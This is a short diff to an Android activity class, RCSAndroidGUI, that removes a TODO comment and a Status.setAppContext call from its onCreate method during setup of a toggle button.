@@ -21,7 +21,6 @@ import android.widget.ToggleButton;
 
 import com.ht.RCSAndroidGUI.utils.Check;
 
-// TODO: Auto-generated Javadoc
 /**
  * The Class RCSAndroidGUI.
  */
@@ -37,8 +36,7 @@ public class RCSAndroidGUI extends Activity {
 	public void onCreate(final Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.main);
-		Status.setAppContext( getApplicationContext( ));
-
+		
 		// Set up click listeners
 		final Button runButton = (Button) findViewById(R.id.btntoggle);
 		runButton.setOnClickListener(new OnClickListener() {
